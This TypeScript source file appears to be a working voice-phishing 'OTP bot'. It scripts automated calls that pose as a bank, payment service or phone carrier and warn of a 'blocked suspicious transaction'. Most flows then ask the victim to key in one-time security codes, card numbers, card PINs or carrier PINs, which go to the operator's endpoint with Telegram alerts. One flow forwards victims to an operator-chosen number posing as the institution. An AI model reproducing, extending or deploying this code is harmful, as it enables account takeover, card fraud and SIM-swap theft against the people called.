import { Response } from 'express';
import { v4 as uuidv4 } from 'uuid';
import { bot } from '..';

export const bankFlow = async (
  dtmf: string,
  res: Response,
  language: string,
  chatId: number | undefined,
  step: string,
  destination: string,
): Promise<Response> => {
  if (dtmf && dtmf === '1') {
    await bot.telegram.sendMessage(
      Number(chatId),
      `On call (${destination}) 🤳🏽`,
      {
        parse_mode: 'HTML',
      },
    );
    return res.json({
      id: uuidv4(),
      title: `call bank - ${chatId} OTP`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload:
              'For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key',
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'bankStepOTP',
          endKey: '#',
          maxNumKeys: 8,
          onKeypressVar: 'dtmf',
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'bankStepOTP',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          action: 'hangup',
        },
        {
          id: 'bankStepOTP',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '2') {
    await bot.telegram.sendMessage(
      Number(chatId),
      `On call (${destination}) 🤳🏽`,
      {
        parse_mode: 'HTML',
      },
    );
    return res.json({
      id: uuidv4(),
      title: `call bank - ${chatId} OTP`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload:
              'For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key',
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'bankStepOTP',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 10,
          },
          onKeypressGoto: 'bankStepOTP',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: 'bankStepOTP',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '3') {
    return res.json({
      id: uuidv4(),
      title: `call bank - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `We have BLOCKED a recent SUSPICIOUS transaction on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'bankStepGoto',
          onKeypressVar: 'dtmf',
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'bankStepGoto',
          onKeypressVar: 'dtmf',
        },
        {
          action: 'hangup',
        },
        {
          id: 'bankStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '*') {
    return res.json({
      id: uuidv4(),
      title: `call bank - ${chatId} no OTP`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload:
              'OKAY, you might receive another automated call if we detect a security code has been sent to you. Thank you, goodbye.',
            language,
            voice: 'female',
            loop: true,
          },
        },
        // {
        //   id: uuidv4(),
        //   action: 'hangup',
        // },
      ],
    });
  } else {
    return res.json({
      id: uuidv4(),
      title: `call bank - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `You have selected an INVALID option. We have BLOCKED a recent SUSPICIOUS transaction on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'bankStepGoto',
          onKeypressVar: 'dtmf',
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'bankStepGoto',
          onKeypressVar: 'dtmf',
        },
        {
          action: 'hangup',
        },
        {
          id: 'bankStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}`,
          },
        },
      ],
    });
  }
};

export const payFlow = async (
  dtmf: string,
  res: Response,
  language: string,
  chatId: number | undefined,
  step: string,
  destination: string,
  wallet?: string,
): Promise<Response> => {
  if (dtmf && dtmf === '1') {
    await bot.telegram.sendMessage(
      Number(chatId),
      `On call (${destination}) 🤳🏽`,
      {
        parse_mode: 'HTML',
      },
    );
    return res.json({
      id: uuidv4(),
      title: `call pay - ${chatId} OTP`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key`,
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'payStepOTP',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 10,
          },
          onKeypressGoto: 'payStepOTP',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: 'payStepOTP',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '2') {
    await bot.telegram.sendMessage(
      Number(chatId),
      `On call (${destination}) 🤳🏽`,
      {
        parse_mode: 'HTML',
      },
    );
    return res.json({
      id: uuidv4(),
      title: `call pay - ${chatId} OTP`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key`,
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'payStepOTP',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 10,
          },
          onKeypressGoto: 'payStepOTP',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: 'payStepOTP',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '3') {
    return res.json({
      id: uuidv4(),
      title: `call pay - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `We have BLOCKED a recent SUSPICIOUS ${wallet} purchase. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'payStepGoto',
          onKeypressVar: 'dtmf',
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'payStepGoto',
          onKeypressVar: 'dtmf',
        },
        {
          action: 'hangup',
        },
        {
          id: 'payStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${
              process.env.ENDPOINT_URL
            }/calls/dtmf/${language}/${step}/${chatId}?wallet=${wallet
              ?.replace(/\s/g, '')
              .toLowerCase()}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '*') {
    return res.json({
      id: uuidv4(),
      title: `call pay - ${chatId} no OTP`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `OKAY, you might receive another automated call if we detect a security code has been sent to you. Thank you, goodbye.`,
            language,
            voice: 'female',
            loop: true,
          },
        },
        // {
        //   id: uuidv4(),
        //   action: 'hangup',
        // },
      ],
    });
  } else {
    return res.json({
      id: uuidv4(),
      title: `call pay - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `You have selected an INVALID option. We have BLOCKED a recent SUSPICIOUS ${wallet} purchase. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'payStepGoto',
          onKeypressVar: 'dtmf',
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'payStepGoto',
          onKeypressVar: 'dtmf',
        },
        {
          action: 'hangup',
        },
        {
          id: 'payStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${
              process.env.ENDPOINT_URL
            }/calls/dtmf/${language}/${step}/${chatId}?wallet=${wallet
              ?.replace(/\s/g, '')
              .toLowerCase()}`,
          },
        },
      ],
    });
  }
};

export const accountFlow = async (
  dtmf: string,
  res: Response,
  language: string,
  chatId: number | undefined,
  step: string,
  destination: string,
  askCardInfo?: string,
): Promise<Response> => {
  if (dtmf && dtmf === '1') {
    await bot.telegram.sendMessage(
      Number(chatId),
      `On call (${destination}) 🤳🏽`,
      {
        parse_mode: 'HTML',
      },
    );
    return res.json({
      id: uuidv4(),
      title: `call account - ${chatId} OTP`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `For your SECURITY and to BLOCK this login attempt, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key`,
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'accountStepOTP',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 10,
          },
          onKeypressGoto: 'accountStepOTP',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: 'accountStepOTP',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?askCardInfo=${askCardInfo}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '2') {
    await bot.telegram.sendMessage(
      Number(chatId),
      `On call (${destination}) 🤳🏽`,
      {
        parse_mode: 'HTML',
      },
    );
    return res.json({
      id: uuidv4(),
      title: `call account - ${chatId} OTP`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `For your SECURITY please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the code yet please press the star key followed by the pound key`,
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'accountStepOTP',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 10,
          },
          onKeypressGoto: 'accountStepOTP',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: 'accountStepOTP',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?askCardInfo=${askCardInfo}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '3') {
    return res.json({
      id: uuidv4(),
      title: `call account - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `We have BLOCKED a recent SUSPICIOUS login attempt on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'accountStepGoto',
          onKeypressVar: 'dtmf',
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'accountStepGoto',
          onKeypressVar: 'dtmf',
        },
        {
          action: 'hangup',
        },
        {
          id: 'accountStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?askCardInfo=${askCardInfo}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '*') {
    return res.json({
      id: uuidv4(),
      title: `call account - ${chatId} no OTP`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `OKAY, you might receive another automated call if we detect a security code has been sent to you. Thank you, goodbye.`,
            language,
            voice: 'female',
            loop: true,
          },
        },
        // {
        //   id: uuidv4(),
        //   action: 'hangup',
        // },
      ],
    });
  } else {
    return res.json({
      id: uuidv4(),
      title: `call account - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `You have selected an INVALID option. We have BLOCKED a recent SUSPICIOUS login attempt on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'accountStepGoto',
          onKeypressVar: 'dtmf',
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'accountStepGoto',
          onKeypressVar: 'dtmf',
        },
        {
          action: 'hangup',
        },
        {
          id: 'accountStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?askCardInfo=${askCardInfo}`,
          },
        },
      ],
    });
  }
};

export const cardFlow = async (
  dtmf: string,
  res: Response,
  language: string,
  chatId: number | undefined,
  step: string,
  destination: string,
  cardType: string,
): Promise<Response> => {
  if (dtmf && dtmf === '1') {
    await bot.telegram.sendMessage(
      Number(chatId),
      `On call (${destination}) 🤳🏽`,
      {
        parse_mode: 'HTML',
      },
    );
    return res.json({
      id: uuidv4(),
      title: `pay card - ${chatId} OTP`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the pound key`,
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'cardStepOTP',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 20,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'cardStepOTP',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 20,
        },
        {
          id: 'cardStepOTP',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?cardType=${cardType}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '2') {
    await bot.telegram.sendMessage(
      Number(chatId),
      `On call (${destination}) 🤳🏽`,
      {
        parse_mode: 'HTML',
      },
    );
    return res.json({
      id: uuidv4(),
      title: `call card - ${chatId} OTP`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `For your SECURITY, please enter your ${cardType} card number followed by the pound key`,
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'cardStepOTP',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 20,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'cardStepOTP',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 20,
        },
        {
          id: 'cardStepOTP',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?cardType=${cardType}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '3') {
    return res.json({
      id: uuidv4(),
      title: `call card - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `We have BLOCKED a recent SUSPICIOUS login attempt on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'cardStepGoto',
          onKeypressVar: 'dtmf',
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'cardStepGoto',
          onKeypressVar: 'dtmf',
        },
        {
          action: 'hangup',
        },
        {
          id: 'cardStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?cardType=${cardType}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '*') {
    return res.json({
      id: uuidv4(),
      title: `call card - ${chatId} no OTP`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `OKAY, you might receive another automated call if we detect a security code has been sent to you. Thank you, goodbye.`,
            language,
            voice: 'female',
            loop: true,
          },
        },
        // {
        //   id: uuidv4(),
        //   action: 'hangup',
        // },
      ],
    });
  } else {
    return res.json({
      id: uuidv4(),
      title: `call card - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `You have selected an INVALID option. We have BLOCKED a recent SUSPICIOUS online purchase, your ${cardType} card details was used. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'cardStepGoto',
          onKeypressVar: 'dtmf',
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'cardStepGoto',
          onKeypressVar: 'dtmf',
        },
        {
          action: 'hangup',
        },
        {
          id: 'cardStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?cardType=${cardType}`,
          },
        },
      ],
    });
  }
};

export const pinFlow = async (
  dtmf: string,
  res: Response,
  language: string,
  chatId: number | undefined,
  step: string,
  destination: string,
  pinType: string,
): Promise<Response> => {
  if (dtmf && dtmf === '1') {
    await bot.telegram.sendMessage(
      Number(chatId),
      `On call (${destination}) 🤳🏽`,
      {
        parse_mode: 'HTML',
      },
    );
    return res.json({
      id: uuidv4(),
      title: `pin step - ${chatId} OTP`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload:
              pinType === 'carrierPin'
                ? `To verify and secure your phone number, please enter your ${pinType} followed by the pound key.`
                : `For your security and to protect your account. enter your ${pinType} numbers followed by the pound key`,
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'pinStepOTP',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: pinType === 'carrierPin' ? 6 : 4,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'pinStepOTP',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 20,
        },
        {
          id: 'pinStepOTP',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/pins/${step}/${chatId}/${language}?pinType=${pinType}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '2') {
    await bot.telegram.sendMessage(
      Number(chatId),
      `On call (${destination}) 🤳🏽`,
      {
        parse_mode: 'HTML',
      },
    );
    return res.json({
      id: uuidv4(),
      title: `pin step - ${chatId} OTP`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload:
              pinType === 'carrierPin'
                ? `To verify and secure your phone number, please enter your ${pinType} followed by the pound key.`
                : `For your security and to protect your account. enter your ${pinType} followed by the pound key`,
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'pinStepOTP',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: pinType === 'carrierPin' ? 6 : 4,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'pinStepOTP',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 20,
        },
        {
          id: 'pinStepOTP',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/pins/${step}/${chatId}/${language}?pinType=${pinType}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '3') {
    return res.json({
      id: uuidv4(),
      title: `pin step - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload:
              pinType === 'carrierPin'
                ? `There as been a suspicious activity on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`
                : `We recently noticed a SUSPICIOUS activity on your CARD. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'cardStepGoto',
          onKeypressVar: 'dtmf',
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'cardStepGoto',
          onKeypressVar: 'dtmf',
        },
        {
          action: 'hangup',
        },
        {
          id: 'cardStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/dpins/${language}/${step}/${chatId}?pinType=${pinType}`,
          },
        },
      ],
    });
  } else {
    return res.json({
      id: uuidv4(),
      title: `pin step - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload:
              pinType === 'carrierPin'
                ? `You have selected an INVALID option. There as been a suspicious activity on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`
                : `You have selected an INVALID option. We recently noticed a SUSPICIOUS activity on your CARD. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'cardStepGoto',
          onKeypressVar: 'dtmf',
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'cardStepGoto',
          onKeypressVar: 'dtmf',
        },
        {
          action: 'hangup',
        },
        {
          id: 'cardStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/dpins/${language}/${step}/${chatId}?pinType=${pinType}`,
          },
        },
      ],
    });
  }
};

export const pgpFlow = async (
  dtmf: string,
  res: Response,
  language: string,
  chatId: number | undefined,
  step: string,
  destination: string,
  transferNumber: string,
  institutionName: string,
  from: string,
): Promise<Response> => {
  if (dtmf && dtmf === '1') {
    await bot.telegram.sendMessage(
      Number(chatId),
      `On call (${destination}) 🤳🏽`,
      {
        parse_mode: 'HTML',
      },
    );
    return res.json({
      id: uuidv4(),
      title: `${chatId} - Forward call to ${transferNumber}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'transfer',
          options: {
            source: from,
            destination: transferNumber,
          },
        },
      ],
    });
  } else {
    return res.json({
      id: uuidv4(),
      title: `Calling - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            ifMachine: 'delay',
            payload: `You have selected an INVALID option. Welcome to the ${institutionName} fraud prevention line. We recently notice a SUSPICIOUS activity on your account. If this was you, simply HANG UP. If this was not you, PLEASE press ONE to speak to a ${institutionName} representative; to better assist you in SECURING your ACCOUNT.`,
            language,
            voice: 'female',
            length: 5,
          },
          onKeypressGoto: 'nextStep',
          onKeypressVar: 'dtmf',
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStep',
          onKeypressVar: 'dtmf',
        },
        {
          id: 'nextStep',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?transferNumber=${transferNumber}&from=${from}`,
          },
        },
      ],
    });
  }
};
